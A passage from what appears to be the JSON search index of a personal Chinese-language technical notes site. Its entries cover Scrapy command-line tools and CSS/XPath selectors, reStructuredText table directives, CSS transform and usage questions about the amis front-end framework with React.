python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-crawl.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-crawl.html"},{"title":"edit","text":"依赖项目目录 语法: scrapy edit <spider> 使用 EDITOR 环境变量指定的编辑器(没有就用配置的 EDITOR), 来编辑指定的爬虫 仅是一个便捷的修改方式","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-edit.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-edit.html"},{"title":"fetch","text":"不依赖项目目录 语法: scrapy fetch <url> 使用 Scrapy downloader 下载给定的URL, 下载结果在标准输出 如果在项目内, 与爬虫获取到的页面是一致的(会使用配置的属性如 USER-AGENT) 如果在其他目录, 使用默认的配置属性 支持选项 --spider= SPIDER 指定执行的爬虫, 没有就自动探测 --headers 打印 HTTP 响应的消息头, 而不是打印 body --no-redirect 如果获取消息时, 遇到 3xx 的重定向, 就放弃(默认会跟着重定向到新地址) Usage examples: $ scrapy fetch --nolog http://www.example.com/some/page.html\n[ ... html content here ... ]\n\n$ scrapy fetch --nolog --headers http://www.example.com/\n{'Accept-Ranges': ['bytes'],\n'Age': ['1263   '],\n'Connection': ['close     '],\n'Content-Length': ['596'],\n'Content-Type': ['text/html; charset=UTF-8'],\n'Date': ['Wed, 18 Aug 2010 23:59:46 GMT'],\n'Etag': ['\"573c1-254-48c9c87349680\"'],\n'Last-Modified': ['Fri, 30 Jul 2010 15:30:18 GMT'],\n'Server': ['Apache/2.2.3 (CentOS)']}","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-fetch.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-fetch.html"},{"title":"list","text":"依赖项目目录 列出所有的爬虫, 以行为分隔符. 语法: scrapy list 用例: $ scrapy list\nspider1\nspider2","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-list.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-list.html"},{"title":"runspider","text":"不依赖项目目录 语法: scrapy runspider <spider_file.py> 将目录下的单个Python文件视作爬虫, 运行 Example usage: $ scrapy runspider myspider.py\n[ ... spider starts crawling ... ]","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-runspider.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-runspider.html"},{"title":"shell","text":"不依赖项目目录 启动一个交互式的爬虫终端, 如果有ipython就会用ipython: scrapy shell $url 启动成功后, 在当前环境会有一个 response 变量, 代表爬虫的响应,\n与爬虫类 parse 方法的第一个 response 参数一致. 支持选项 --spider= SPIDER 使用指定爬虫的url -c code 执行指定的代码并输出 --no-redirect 不重定向 Usage example: $ scrapy shell http://www.example.com/some/page.html\n[ ... scrapy shell starts ... ]\n\n$ scrapy shell --nolog http://www.example.com/ -c '(response.status, response.url)'\n(200, 'http://www.example.com/')\n\n# shell follows HTTP redirects by default\n$ scrapy shell --nolog http://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F -c '(response.status, response.url)'\n(200, 'http://example.com/')\n\n# you can disable this with --no-redirect\n# (only for the URL passed as command line argument)\n$ scrapy shell --no-redirect --nolog http://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F -c '(response.status, response.url)'\n(302, 'http://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F')","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-shell.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-shell.html"},{"title":"version","text":"不依赖项目目录 语法: scrapy version [-v] 打印 Scrapy 版本信息. -v 还会额外输出 Python, Twisted and Platform 信息","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-version.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-version.html"},{"title":"CSS选择器","text":"主要是用法. 概述: ::text            获取文本\n::attr(属性名)    获取指定属性\n*::text           * 表示所有, 即获取所有文本 比如有: 如有以下HTML::\n\n<!DOCTYPE html>\n\n<html>\n  <head>\n    <base href='http://example.com/' />\n    <title>Example website</title>\n  </head>\n  <body>\n    <div id='images'>\n      <a href='image1.html'>Name: My image 1 <br /><img src='image1_thumb.jpg' alt='image1'/></a>\n      <a href='image2.html'>Name: My image 2 <br /><img src='image2_thumb.jpg' alt='image2'/></a>\n      <a href='image3.html'>Name: My image 3 <br /><img src='image3_thumb.jpg' alt='image3'/></a>\n      <a href='image4.html'>Name: My image 4 <br /><img src='image4_thumb.jpg' alt='image4'/></a>\n      <a href='image5.html'>Name: My image 5 <br /><img src='image5_thumb.jpg' alt='image5'/></a>\n    </div>\n  </body>\n</html> 选择title的内容: title::text 获取 href: html head base::attr(className) 获取所有 image 下的文本: #images *::text 在代码中就是: >>> response.css(\"#images *::text\").getall()\n['\\n   ',\n'Name: My image 1 ',\n'\\n   ',\n'Name: My image 2 ',\n'\\n   ',\n'Name: My image 3 ',\n'\\n   ',\n'Name: My image 4 ',\n'\\n   ',\n'Name: My image 5 ',\n'\\n  ']","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Selector-CSS-selector.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Selector-CSS-selector.html"},{"title":"XPath选择器","text":"XPath 参考 index 概述: text()            获取文本\n@属性名           获取指定属性, 不跟表达式仅表示存在当前属性\n\nhas-class         是否包含指定class\n                  has-class(\"cl1\")      是否包含 class属性 cl1 (仅Scrapy支持) 如有以下HTML: <!DOCTYPE html>\n\n<html>\n  <head>\n    <base href='http://example.com/' />\n    <title>Example website</title>\n  </head>\n  <body>\n    <div id='images'>\n      <a href='image1.html'>Name: My image 1 <br /><img src='image1_thumb.jpg' alt='image1'/></a>\n      <a href='image2.html'>Name: My image 2 <br /><img src='image2_thumb.jpg' alt='image2'/></a>\n      <a href='image3.html'>Name: My image 3 <br /><img src='image3_thumb.jpg' alt='image3'/></a>\n      <a href='image4.html'>Name: My image 4 <br /><img src='image4_thumb.jpg' alt='image4'/></a>\n      <a href='image5.html'>Name: My image 5 <br /><img src='image5_thumb.jpg' alt='image5'/></a>\n    </div>\n    <div class='cl1 cl2'>\n      Name: My image 5 <br />\n      <img src='image5_thumb.jpg' alt='image5'/>\n    </div>\n  </body>\n</html> 选择title的内容: //title/text() 获取所有 a 标签的内容: //div[@id=\"images\"]/a/text() 包含使用 contains contains(@id, \"images\") 比如有多个class属性的时候, =是不成立的, 只好用 contains,\n参考 XpathContain : //div[contains(@class, \"cl1\")]/img/@src 可以发现使用 contains 是比较麻烦的,\n且不易兼容所有情况,\n所以有时还是使用 CSS选择器 更简单: .css(\"div.cl1\").xpath(\"./img/@src\") 可参考 XPath运算符 加不加括号的区别 举例: <ul class=\"list\">\n    <li>1</li>\n    <li>2</li>\n    <li>3</li>\n</ul>\n<ul class=\"list\">\n    <li>4</li>\n    <li>5</li>\n    <li>6</li>\n</ul> 不加括号(选择所有组节点): //li[1]\n//ul/li[1]\n\n# 结果都是\n['<li>1</li>', '<li>4</li>'] 加括号(将所有组合并一个组): (//li)[1]\n(//ul/li)[1]\n\n# 结果都是\n['<li>1</li>'] 条件表达式下使用text 应该避免直接使用: .//text() 而是使用: . 因为前者在Scrapy框架会返回一个包含所有text文本的生成器结果集(yield []),\n然后当其作为参数传递给 str的函数比如  contains(), starts-with(),\n只会返回第一个结果 比如: >>> from scrapy import Selector\n>>> sel = Selector(\n...     text='<a href=\"#\">Click here to go to the <strong>Next Page</strong></a>'\n... ) 转换为 String 的结果集: >>> sel.xpath(\"//a//text()\").getall()  # take a peek at the node-set\n['Click here to go to the ', 'Next Page']\n>>> sel.xpath(\"string(//a[1]//text())\").getall()  # convert it to string\n['Click here to go to the '] 转换为字符串的节点会丢失后代节点: >>> sel.xpath(\"//a[1]\").getall()  # select the first node\n['<a href=\"#\">Click here to go to the <strong>Next Page</strong></a>']\n>>> sel.xpath(\"string(//a[1])\").getall()  # convert it to string, 丢失了后代\n['Click here to go to the Next Page'] 这时使用 .//text() 得不到任何结果: >>> sel.xpath(\"//a[contains(.//text(), 'Next Page')]\").getall()\n[] 但如果使用 . , 就可获取到: >>> sel.xpath(\"//a[contains(., 'Next Page')]\").getall()\n['<a href=\"#\">Click here to go to the <strong>Next Page</strong></a>'] XPath表达式变量 XPath 允许你在表达式中引用变量, 语法: $varName 与SQL类似, 还支持使用 ? 占位符, 来做变量替换: >>> # `$val` used in the expression, a `val` argument needs to be passed\n>>> response.xpath(\"//div[@id=$val]/a/text()\", val=\"images\").get()\n'Name: My image 1 ' 又比如寻找 div 下包含 5 个孩子节点: >>> response.xpath(\"//div[count(a)=$cnt]/@id\", cnt=5).get()\n'images' 任何变量必须使用的时候就给定值, 否则会报错 ValueError: XPath error: exception 移除命名空间 有些爬虫项目获取到的 HTML/XML 是存在命名空间的,\n但是我们并不关注这个, 只想处理元素,\n所以可以直接移除: Selector.remove_namespaces() 比如以下的XML: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<?xml-stylesheet ...\n<feed xmlns=\"http://www.w3.org/2005/Atom\"\n      xmlns:openSearch=\"http://a9.com/-/spec/opensearchrss/1.0/\"\n      xmlns:blogger=\"http://schemas.google.com/blogger/2008\"\n      xmlns:georss=\"http://www.georss.org/georss\"\n      xmlns:gd=\"http://schemas.google.com/g/2005\"\n      xmlns:thr=\"http://purl.org/syndication/thread/1.0\"\n      xmlns:feedburner=\"http://rssnamespace.org/feedburner/ext/1.0\">\n  ... 有一个默认的 http://www.w3.org/2005/Atom 和其他的\n比如 gd:\" prefix for \"http://schemas.google.com/g/2005\" 当尝试选择 link 时, 获取不到结果: >>> response.xpath(\"//link\")\n[] 因为其存在于默认的命名空间内.\n移除掉即可: >>> response.selector.remove_namespaces()\n>>> response.xpath(\"//link\")\n[<Selector query='//link' data='<link rel=\"alternate\" type=\"text/html\" h'>,\n    <Selector query='//link' data='<link rel=\"next\" type=\"application/atom+'>,\n    ... 为什么默认不直接移除? 移除对整个文档所有节点操作, 代价大 并非所有情况下都不会用到 namespace 使用 EXSLT 拓展 Scrapy选择器构建在lxml之上，支持一些EXCIBLE扩展，\n并带有这些预注册的命名空间，可用于EXCIBLE表达式： prefix namespace usage re http://exslt.org/regular-expressions 正则表达式 set http://exslt.org/sets 集合操作\n(set manipulation) 正则表达式支持 默认 XPath 有提供字符串的 starts-with() 和 contains() 方法,\n但是更复杂的匹配就不行了,  这时可以用 test() 方法 比如选择指定 class 的 li 标签下的 链接: >>> from scrapy import Selector\n>>> doc = \"\"\"\n... <div>\n...     <ul>\n...         <li class=\"item-0\"><a href=\"link1.html\">first item</a></li>\n...         <li class=\"item-1\"><a href=\"link2.html\">second item</a></li>\n...         <li class=\"item-inactive\"><a href=\"link3.html\">third item</a></li>\n...         <li class=\"item-1\"><a href=\"link4.html\">fourth item</a></li>\n...         <li class=\"item-0\"><a href=\"link5.html\">fifth item</a></li>\n...     </ul>\n... </div>\n... \"\"\"\n>>> sel = Selector(text=doc, type=\"html\")\n>>> sel.xpath(\"//li//@href\").getall()\n['link1.html', 'link2.html', 'link3.html', 'link4.html', 'link5.html']\n>>> sel.xpath('//li[re:test(@class, \"item-\\d$\")]//@href').getall()\n['link1.html', 'link2.html', 'link4.html', 'link5.html'] 警告 C库的 libxslt 并不提供 EXSLT 的支持,\n所以实际上匹配使用的是 Python 的 re . 故, 存在性能问题是无法避免的 集合操作 有时候可能不想要文档的某个部分 比如 https://schema.org/Product 的以下内容, 存在\nitemscopes 和 corresponding itemprops: >>> doc = \"\"\"\n... <div itemscope itemtype=\"http://schema.org/Product\">\n...   <span itemprop=\"name\">Kenmore White 17\" Microwave</span>\n...   <img src=\"kenmore-microwave-17in.jpg\" alt='Kenmore 17\" Microwave' />\n...   <div itemprop=\"aggregateRating\"\n...     itemscope itemtype=\"http://schema.org/AggregateRating\">\n...    Rated <span itemprop=\"ratingValue\">3.5</span>/5\n...    based on <span itemprop=\"reviewCount\">11</span> customer reviews\n...   </div>\n...   <div itemprop=\"offers\" itemscope itemtype=\"http://schema.org/Offer\">\n...     <span itemprop=\"price\">$55.00</span>\n...     <link itemprop=\"availability\" href=\"http://schema.org/InStock\" />In stock\n...   </div>\n...   Product description:\n...   <span itemprop=\"description\">0.7 cubic feet countertop microwave.\n...   Has six preset cooking categories and convenience features like\n...   Add-A-Minute and Child Lock.</span>\n...   Customer reviews:\n...   <div itemprop=\"review\" itemscope itemtype=\"http://schema.org/Review\">\n...     <span itemprop=\"name\">Not a happy camper</span> -\n...     by <span itemprop=\"author\">Ellie</span>,\n...     <meta itemprop=\"datePublished\" content=\"2011-04-01\">April 1, 2011\n...     <div itemprop=\"reviewRating\" itemscope itemtype=\"http://schema.org/Rating\">\n...       <meta itemprop=\"worstRating\" content = \"1\">\n...       <span itemprop=\"ratingValue\">1</span>/\n...       <span itemprop=\"bestRating\">5</span>stars\n...     </div>\n...     <span itemprop=\"description\">The lamp burned out and now I have to replace\n...     it. </span>\n...   </div>\n...   <div itemprop=\"review\" itemscope itemtype=\"http://schema.org/Review\">\n...     <span itemprop=\"name\">Value purchase</span> -\n...     by <span itemprop=\"author\">Lucas</span>,\n...     <meta itemprop=\"datePublished\" content=\"2011-03-25\">March 25, 2011\n...     <div itemprop=\"reviewRating\" itemscope itemtype=\"http://schema.org/Rating\">\n...       <meta itemprop=\"worstRating\" content = \"1\"/>\n...       <span itemprop=\"ratingValue\">4</span>/\n...       <span itemprop=\"bestRating\">5</span>stars\n...     </div>\n...     <span itemprop=\"description\">Great microwave for the price. It is small and\n...     fits in my apartment.</span>\n...   </div>\n...   ...\n... </div>\n... \"\"\"\n>>> sel = Selector(text=doc, type=\"html\")\n>>> for scope in sel.xpath(\"//div[@itemscope]\"):\n...     print(\"current scope:\", scope.xpath(\"@itemtype\").getall())\n...     props = scope.xpath(\n...         \"\"\"\n...                 set:difference(./descendant::*/@itemprop,\n...                                .//*[@itemscope]/*/@itemprop)\"\"\"\n...     )\n...     print(f\"    properties: {props.getall()}\")\n...     print(\"\")\n...\n\ncurrent scope: ['http://schema.org/Product']\n    properties: ['name', 'aggregateRating', 'offers', 'description', 'review', 'review']\n\ncurrent scope: ['http://schema.org/AggregateRating']\n    properties: ['ratingValue', 'reviewCount']\n\ncurrent scope: ['http://schema.org/Offer']\n    properties: ['price', 'availability']\n\ncurrent scope: ['http://schema.org/Review']\n    properties: ['name', 'author', 'datePublished', 'reviewRating', 'description']\n\ncurrent scope: ['http://schema.org/Rating']\n    properties: ['worstRating', 'ratingValue', 'bestRating']\n\ncurrent scope: ['http://schema.org/Review']\n    properties: ['name', 'author', 'datePublished', 'reviewRating', 'description']\n\ncurrent scope: ['http://schema.org/Rating']\n    properties: ['worstRating', 'ratingValue', 'bestRating'] 主要是: set:difference(./descendant::*/@itemprop, .//*[@itemscope]/*/@itemprop) set:difference 表示使用一个集合减去另一个集合, 也就是: ./descendant::*/@itemprop 减去: .//*[@itemscope]/*/@itemprop 来分别看分析这两个的含义: ./descendant::*/@itemprop\n  descendant 翻译过来就是后代,\n  这里就是表示当前元素的所有后代元素(后代, 孙代...),\n\n  总来说就是, 所有后代元素的 itemprop 属性\n\n\n.//*[@itemscope]/*/@itemprop\n  选择所有包含 itemscope 属性的 itemprop 属性 整个表达式的含义是选择当前节点的所有后代节点中具有 itemprop 属性的属性节点，\n然后从中排除当前节点下具有 itemscope 属性的元素节点的子节点中的 itemprop 属性节点，\n最后返回剩余的元素节点集合 其他 XPath 拓展 Scrapy 选择器 还提供了 has-class , 可用于判断是否包含 class 属性, 对于HTML: >>> from scrapy.http import HtmlResponse\n>>> response = HtmlResponse(\n...     url=\"http://example.com\",\n...     body=\"\"\"\n... <html>\n...     <body>\n...         <p class=\"foo bar-baz\">First</p>\n...         <p class=\"foo\">Second</p>\n...         <p class=\"bar\">Third</p>\n...         <p>Fourth</p>\n...     </body>\n... </html>\n... \"\"\",\n...     encoding=\"utf-8\",\n... ) 这样用: >>> response.xpath('//p[has-class(\"foo\")]')\n[<Selector query='//p[has-class(\"foo\")]' data='<p class=\"foo bar-baz\">First</p>'>,\n<Selector query='//p[has-class(\"foo\")]' data='<p class=\"foo\">Second</p>'>]\n>>> response.xpath('//p[has-class(\"foo\", \"bar-baz\")]')\n[<Selector query='//p[has-class(\"foo\", \"bar-baz\")]' data='<p class=\"foo bar-baz\">First</p>'>]\n>>> response.xpath('//p[has-class(\"foo\", \"bar\")]')\n[] 其中: //p[has-class(\"foo\", \"bar-baz\")] 相当于 CSS的: p.foo.bar-baz 注解 has-class 其实性能是比较慢的, 因为它是一个纯 Python 函数. 故建议仅适用于, CSS选择器不容易描述的情况下 添加自定义 Python 方法 API: parsel.xpathfuncs.set_xpathfunc(fname: str, func: Optional[Callable]) -> None[source] 用于注册自定义 XPath 表达式方法 Register a custom extension function to use in XPath expressions. fname 方法名 func 具体的执行方法, 为None回注册失败","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Selector-XPath-selector.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Selector-XPath-selector.html"},{"title":"tables","text":"参考: https://docutils.sourceforge.io/docs/ref/rst/directives.html#tables table 表格 支持命令选项: align: \"left\", \"center\", or \"right\" 水平对齐方式 width: length or percentage 将表的宽度设置为指定长度或行宽度的百分比。如果省略，渲染器将根据其内容或列宽度来确定表的宽度。 widths: \"auto\", \"grid\", or a list of integers 明确设置列宽度。如果与宽度选项一起使用，则指定相对宽度。覆盖table_style设置或类值\"colwidths-auto\"。默认值取决于table_style配置设置。 \"auto\"将列宽度的确定委托给后端（LaTeX，HTML浏览器，...）。默认Html5 \"grid\"根据输入列的宽度（以字符为单位）确定列宽度。这个没怎么懂. 源码: .. table:: Truth table for \"not\"\n  :width: 30%\n\n  =====  =====\n    A    not A\n  =====  =====\n  False  True\n  True   False\n  =====  ===== 效果 Truth table for \"not\" A not A False True True False csv-table 以csv（逗号分隔值）数据的形式写表格. 支持单元格内的块标记和内联标记。线端在单元格中被识别。 不支持检查每行中的列数是否相同。该指令会自动在短行末尾添加空条目。 支持命令选项: align: \"left\", \"center\", or \"right\" 水平布局方式 delim: char , \"tab\" , \"space\" 表格列分隔符, 默认逗号, 可自定义为冒号等 encoding: string 若使用url或者csv文件的数据, 用什么编码解析, 默认使用文件输出编码 escape: char 将使用的分隔符转义为普通符号, 默认是双引号\n如: 一列(这里双双引号最终是一对双引号)\n\"He said, \"\"Hi!\"\"\" 两列(双引号不会被输出)\n-M, \"move/rename a branch, even if target exists\" file: string (newlines removed) 引用本地csv文件的路径 header: CSV data 表格头定义, 需要在 header-rows 之前 header-rows:  integer 除了header定义的表头, 数据主体还有几行是表头, 默认0. keepspace: flag (empty) 将分隔符后面的空格视为显著的(将空格输出)。默认情况下是忽略此类空格。 quote: char 一个字符字符串，用于引用包含分隔符或以引号字符开头的元素。默认为\"（引用）。可以指定为Unicode代码点；有关语法详细信息，请参阅unicode指令。 stub-columns: integer 用作存根的表列数量（左侧的行标题）。默认为0。 url: string (whitespace removed) 一个CSV数据表格的链接. widths: integer [integer...] or \"auto\" 相对列宽度列表。默认值为等宽度列（100%/#columns）。 \"auto\"将列宽度的确定委托给后端（LaTeX，HTML浏览器，...）。 width: length or percentage 将表的宽度设置为指定长度或行宽度的百分比。如果省略，渲染器将根据其内容或列宽度来确定表的宽度。 警告 \"Csv-table\"指令的\":file:\"和\":url:\"选项代表了潜在的安全漏洞。它们可以通过\"file_insertion_enabled\"运行时设置禁用。 源码: .. csv-table:: Frozen Delights!\n  :header:\n    \"Treat\", \"Quantity\", \"Description\"\n    \"Treat2\", \"Quantity2\", \"Description2\"\n  :widths: 15, 10, 30\n  :header-rows: 1\n\n  \"Albatross\", 2.99, \"On a stick!\"\n  \"Crunchy Frog\", 1.49, \"If we took the bones out, it wouldn't be\n  crunchy, now would it?\"\n  \"Gannet Ripple\", 1.99, \"On a stick!\" 效果 Frozen Delights! Treat Quantity Description Treat2 Quantity2 Description2 Albatross 2.99 On a stick! Crunchy Frog 1.49 If we took the bones out, it wouldn't be\ncrunchy, now would it? Gannet Ripple 1.99 On a stick! list-table 以列表的形式创建表格, 注意保持元素列一致 支持的命令选项: align: \"left\", \"center\", or \"right\" 水平对其方式 header-rows: integer 表头行数 stub-columns: integer 用作存根的表列数量（左侧的行标题）。默认为0。 width: length or percentage 将表的宽度设置为指定长度或行宽度的百分比。如果省略，渲染器将根据其内容或列宽度来确定表的宽度。 widths: integer [integer...] or \"auto\" 相对列宽度列表。默认值为等宽度列（100%/#columns）。 \"auto\"将列宽度的确定委托给后端（LaTeX，HTML浏览器，...）。 源码: .. list-table:: Frozen Delights!\n  :widths: 15 10 30\n  :header-rows: 1\n  :stub-columns: 1\n\n  * - Treat\n    - Quantity\n    - Description\n  * - Albatross\n    - 2.99\n    - On a stick!\n  * - Crunchy Frog\n    - 1.49\n    - If we took the bones out, it wouldn't be\n    crunchy, now would it?\n  * - Gannet Ripple\n    - 1.99\n    - On a stick! 效果 Frozen Delights! Treat Quantity Description Albatross 2.99 On a stick! Crunchy Frog 1.49 If we took the bones out, it wouldn't be\ncrunchy, now would it? Gannet Ripple 1.99 On a stick!","tags":"文档","url":"/yq-docs-document-RST-mark-language-DOC-grammar-module-tables.html","loc":"/yq-docs-document-RST-mark-language-DOC-grammar-module-tables.html"},{"title":"表格","text":"支持的指令 table csv-table list-table 符号表格 table 简单表格, 例: .. table:: 一个测试表格\n  :name: csv表格\n\n  ======      ========        ========\n  head    1         2\n  ======      ========        ========\n  1       2         3\n  2       3         4\n  3       4         5\n  ======      ========        ======== 注解 简单表格可以不需要 ..table , 直接使用符号画出来可以自动识别 csv-table csv数据表格, 支持自定义分隔符, 例: .. csv-table:: 一个测试表格\n  :name: 不知道有啥用\n  :header: head, 1, 2\n\n  1, 2, 3\n  2, 3, 4\n  3, 4, 5 list-table 列表格式表格: .. list-table:: 一个测试表格\n  :name: test_list表格\n  :header-rows: 1\n\n  * - head\n    - 1\n    - 2\n  * - 1\n    - 2\n    - 3\n  * - 2\n    - 3\n    - 4\n  * - 3\n    - 4\n    - 5 符号表格 我这样称, 没注意官方怎么定义. 源码: +-------+-------+-------+\n| head1 | head2 | head3 |\n+=======+=======+=======+\n| 1     | 2     | 3     |\n+-------+-------+-------+\n| 4     | 5     | 6     |\n+-------+-------+-------+\n| 7     | 8     | 9     |\n+-------+-------+-------+ 效果基本都是一样的: head1 head2 head3 1 2 3 2 3 4 3 4 5 注解 这种符号表格, 只能用空格而不是tab, 否则会导致识别不正常(截止于Sphinx5.3, 后续没试过) 另外符号表格画起来好麻烦 表格折行打印 有时候文字太长, 需要折行视为同一行 简单表格只能实现第二列后的折行 合并也支持 效果: hd 1 2 1 2\n889 5\n456 2 3 6 3 4 7 源码 也支持表格合并 合并表格体第二行: hd 1 2 1 2\n889 5\n456 2 3          6 3 4 7 源码: 此处参考: 表格学习 符号表格可以实现所有列的折行 head1 head2 head3 1\n4 2\n24 3 34 2 3 4 3 4 5","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-sheet.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-sheet.html"},{"title":"transform","text":"允许你旋转，缩放，倾斜或平移给定元素(包括2D/3D)。这是通过修改 CSS 视觉格式化模型的坐标空间来实现的。 示例: https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform 说明: https://www.w3school.com.cn/cssref/pr_transform.asp 常见的 transform 属性值及其作用 平移（Translate） translate() 函数用于在水平和垂直方向上平移元素: transform: translate(100px, 50px); 上述代码将把元素向右平移 100 像素，向下平移 50 像素。 旋转（Rotate） rotate() 函数用于按指定角度旋转元素: transform: rotate(45deg); 上述代码将元素顺时针旋转 45 度。 缩放（Scale） scale() 函数用于按指定比例缩放元素: transform: scale(1.5); 上述代码将元素的尺寸放大到原始尺寸的 1.5 倍。 支持不同方向的缩放, 比如仅缩放高度: transform: scaleY(1.5); 倾斜（Skew） skew() 函数用于按指定角度倾斜元素: transform: skew(30deg, -10deg); 上述代码将元素水平方向倾斜 30 度，垂直方向倾斜 -10 度。 其他 矩阵变换（matrix()）、透视效果（perspective()）","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-transform.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-transform.html"},{"title":"调用其他组件","text":"比如调用Form的submit, 在action中定义: {\n  \"type\": \"action\",\n  \"label\": \"提交表单\",\n  \"level\": \"primary\",\n  \"className\": \"mr-3 mb-3\",\n  \"onEvent\": {\n    \"click\": {\n      \"actions\": [\n        {\n          \"actionType\": \"submit\",\n          \"componentId\": \"form-action-receiver\"\n        }\n      ]\n    }\n  }\n}, 其中, \"componentId\": \"form-action-receiver\" 表示需要在form中定义id: id: \"form-action-receiver\" form支持的行为: https://aisuda.bce.baidu.com/amis/zh-CN/components/form /index#动作表 注解 如果要同时定义多个action, 可以使用actions串行列表.\n如dialog的onEvent: type: \"dialog\",\n...\nonEvent: {\n    confirm: {\n        actions: [\n            {\n                actionType: 'setValue',\n                componentId: \"top-form\",\n                args: {\n                    value: {\n                        envD: '${ENCODEJSON(envDD)}',\n                        envDD: '${envDD}',\n                        eName: 'x${eName}'\n                    }\n                }\n            },\n            {\n                actionType: 'setValue',\n                componentId: \"dis-data\",\n                args: {\n                    value: {\n                        envD: '${ENCODEJSON(envDD)}',\n                        envDD: 'x${envDD}',\n                        eName: 'x${eName}'\n                    }\n                }\n            },\n            {\n                actionType: 'custom',\n                script: (context: any, doAction: any, event: any) => {\n                    console.log(context)\n                }\n            }\n        ]\n    }\n} 最后的 custom 属于 自定义JS 见: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/event-action#自定义-js","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Call-other-components.html","loc":"/yq-docs-front-end-frame-amis-question-Call-other-components.html"},{"title":"调用本地自定义函数","text":"这个是个坑, 官网文档只提了一句 Button , 且不支持完全自定义参数,\n其他控件比如 Dialog 的完全不知道怎么用 比如 button 的点击事件, onClick 直接给函数引用: {\n    \"type\": \"page\",\n    \"body\": [\n        {\n            \"type\": \"button\",\n            \"label\": \"调用本地函数\",\n            \"onClick\": this._handleUpdate,\n        }\n    ]\n} 又比如 dialog 的 onConfirm dialog: {\n    onConfirm: this._handleUpdate,\n    type: 'dialog',\n    data: {\n        envData: {\n            5: 9,\n        }\n    },\n    body: [\n        {\n            \"type\": \"input-kv\",\n            \"name\": \"envData\",\n        }\n    ]\n} Button 的参数列表为 (event, props) ,\n可以通过 props.data 访问到数据域的内容.","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Call-the-local-custom-function.html","loc":"/yq-docs-front-end-frame-amis-question-Call-the-local-custom-function.html"},{"title":"combo无法指定更新某一个","text":"第一次遇到是使用 input-array ,\n数组的每一个项有多个指定的值, 指定项id并使用 componentId , 会造成只能更新第一个项的数据,\n即使是由其他项触发. 这个时候可以使用 componentName 指定当前项的name, 会自动处理 实测使用官网提的 this.index 无效: https://aisuda.bce.baidu.com/amis/zh-CN/components/form/combo#设置序号","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Combo-cannot-specify-a-certain-update.html","loc":"/yq-docs-front-end-frame-amis-question-Combo-cannot-specify-a-certain-update.html"},{"title":"与React结合使用的数据更新","text":"这个算是一个小坑, React 的数据域, 向来都是通过 state 来控制渲染. 原以为 amis 已经内置处理了这个问题, 结果没有, 还是得 state 出马: import {render as renderAmis} from 'amis';\n\nexport class MyComponent extends React.Component<any, any> {\n  state = {\n      _envData: {\n          1: 5,\n          2: 6,\n      }\n  }\n\n  render(){\n    return (\n      <div>\n        {renderAmis(\n          {\n            type: 'page',\n            title: '简单页面',\n            data:  {\n                envData: this.state._envData,\n            },\n            body: [...]\n          }\n        )}\n      </div>\n    )\n  }\n\n}","tags":"前端","url":"/yq-docs-front-end-frame-amis-question-Data-update-used-with-React.html","loc":"/yq-docs-front-end-frame-amis-question-Data-update-used-with-React.html"},{"title":"dialog更新父组件数据域","text":"一般来说有两种方案 方案一: 如果使用的是API, 在dialog上增加一个数据更新的API即可,\n外部也需要有查询的API 方案二: 使用dialog提供的 setValue , 可以指定更新某位置的数据域,\n需要提前使用id指定位置: {\n    type: \"service\",\n    data: {\n        envData: this.state._envData,\n        eName: 'tt'\n    },\n    body: [\n        {\n            type: 'grid',\n            columns: [\n                {\n                    type: 'form',\n                    id: 'top-form',\n                    body: [\n                        {\n                            type: 'input-text',\n                            name: 'eName',\n                            label: 'label0',\n                            mode: \"horizontal\",\n                        },\n                        {\n                            type: 'flex',\n                            style: {\n                                width: '100%',\n                                height: '100%',\n                                justifyContext: 'flex-end',\n                                flexDirection: 'column'\n                            },\n                            items: [\n                                {\n                                    icon: 'fas fa-list-ul',\n                                    type: 'button',\n                                    actionType: 'dialog',\n                                    dialog: {\n                                        type: 'dialog',\n                                        body: [\n                                            {\n                                                type: \"input-kv\",\n                                                name: \"envData\",\n                                            },\n                                            {\n                                                type: 'input-text',\n                                                label: \"name${eName}\",\n                                                name: 'eName',\n                                            }\n                                        ],\n                                        onEvent: {\n                                            confirm: {\n                                                actions: [\n                                                    {\n                                                        actionType: 'setValue',\n                                                        componentId: \"top-form\",\n                                                        args: {\n                                                            value: {\n                                                                eName: 'x${eName}'\n                                                            }\n                                                        }\n                                                    }\n                                                ]\n                                            }\n                                        }\n                                    }\n                                },\n                            ]\n                        },\n                    ]\n                },\n            ]\n        },\n    ]\n}, 主要的, 定义id: id: 'top-form', 